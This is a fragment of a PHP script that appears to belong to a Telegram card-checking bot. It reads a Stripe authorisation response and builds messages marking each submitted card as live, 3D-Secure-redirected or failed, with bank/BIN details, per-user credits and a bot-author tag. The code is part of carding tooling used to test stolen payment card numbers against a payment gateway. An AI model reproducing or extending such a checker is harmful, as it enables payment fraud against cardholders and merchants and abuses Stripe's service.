elseif (strpos($curl5, 'invalid_request_error')){
$ccrsp = "<b>• TranSaction Info :- </b>\n\n--» <u>Card Details 💳</u> : <code>$lista</code>\n--» <u>Only Card 💳</u> : <code>$cc</code>\n--» <u>Card Status </u> : ❌ Failed To Auth ( $messagee - $dcode )\n--» <u>Gateway </u> : Stripe Auth (v3)\n\n<b>• Bin Info :- </b>\n\n--» <b><u>Bank🏦</u> : $bank1 - $brand - $bin - $name2 - $currency</b>\n\n<b>• Other Info :- </b>\n\n-» <u>Took ⌛</u> : $time seconds \n-» <u>Credits Left </u> : <code>$newCredits </code>\n-» <u>Checked By 🤵</u> : <b><a href='tg://user?id=$userId'>$userId</a></b> \n-» <u>Bot By 👨‍💼</u> : <code>Tkkytrs</code>\n";
}
elseif (strpos($curl5, 'three_d_secure_redirect')){
$ccrsp = "<b>• TranSaction Info :- </b>\n\n--» <u>Card Details 💳</u> : <code>$lista</code>\n--» <u>Only Card 💳</u> : <code>$cc</code>\n--» <u>Card Status </u> : ❌ Failed To Auth ( 3D Authentication - Redirected To Bank's Authentication Page )\n--» <u>Gateway </u> : Stripe Auth (v3)\n\n<b>• Bin Info :- </b>\n\n--» <b><u>Bank🏦</u> : $bank1 - $brand - $bin - $name2 - $currency</b>\n\n<b>• Other Info :- </b>\n\n-» <u>Took ⌛</u> : $time seconds \n-» <u>Credits Left </u> : <code>$newCredits </code>\n-» <u>Checked By 🤵</u> : <b><a href='tg://user?id=$userId'>$userId</a></b> \n-» <u>Bot By 👨‍💼</u> : <code>Tkkytrs</code>\n";
}
elseif (strpos($curl5, '3ds2')){
$ccrsp = "<b>• TranSaction Info :- </b>\n\n--» <u>Card Details 💳</u> : <code>$lista</code>\n--» <u>Only Card 💳</u> : <code>$cc</code>\n--» <u>Card Status </u> : ❌ Failed To Auth ( 3D Authentication - Redirected To Bank's Authentication Page )\n--» <u>Gateway </u> : Stripe Auth (v3)\n\n<b>• Bin Info :- </b>\n\n--» <b><u>Bank🏦</u> : $bank1 - $brand - $bin - $name2 - $currency</b>\n\n<b>• Other Info :- </b>\n\n-» <u>Took ⌛</u> : $time seconds \n-» <u>Credits Left </u> : <code>$newCredits </code>\n-» <u>Checked By 🤵</u> : <b><a href='tg://user?id=$userId'>$userId</a></b> \n-» <u>Bot By 👨‍💼</u> : <code>Tkkytrs</code>\n";
}
elseif (strpos($curl5, 'status": "succeeded')){
$ccrsp = "<b>• TranSaction Info :- </b>\n\n--» <u>Card Details 💳</u> : <code>$lista</code>\n--» <u>Only Card 💳</u> : <code>$cc</code>\n--» <u>Card Status </u> : ✅ Stripe Auth Live ( $status )\n--» <u>Gateway </u> : Stripe Auth (v3)\n\n<b>• Bin Info :- </b>\n\n--» <b><u>Bank🏦</u> : $bank1 - $brand - $bin - $name2 - $currency</b>\n\n<b>• Other Info :- </b>\n\n-» <u>Took ⌛</u> : $time seconds \n-» <u>Credits Left </u> : <code>$newCredits </code>\n-» <u>Checked By 🤵</u> : <b><a href='tg://user?id=$userId'>$userId</a></b> \n-» <u>Bot By 👨‍💼</u> : <code>Tkkytrs</code>\n";
}
else{
$ccrsp = "<b>• TranSaction Info :- </b>\n\n--» <u>Card Details 💳</u> : <code>$lista</code>\n--» <u>Only Card 💳</u> : <code>$cc</code>\n--» <u>Card Status </u> : ❌ Failed To Auth ( $messagee - $dcode )\n--» <u>Gateway </u> : Stripe Auth (v3)\n\n<b>• Bin Info :- </b>\n\n--» <b><u>Bank🏦</u> : $bank1 - $brand - $bin - $name2 - $currency</b>\n\n<b>• Other Info :- </b>\n\n-» <u>Took ⌛</u> : $time seconds \n-» <u>Credits Left </u> : <code>$newCredits </code>\n-» <u>Checked By 🤵</u> : <b><a href='tg://user?id=$userId'>$userId</a></b> \n-» <u>Bot By 👨‍💼</u> : <code>Tkkytrs</code>\n";
}
curl_close($ch);

?>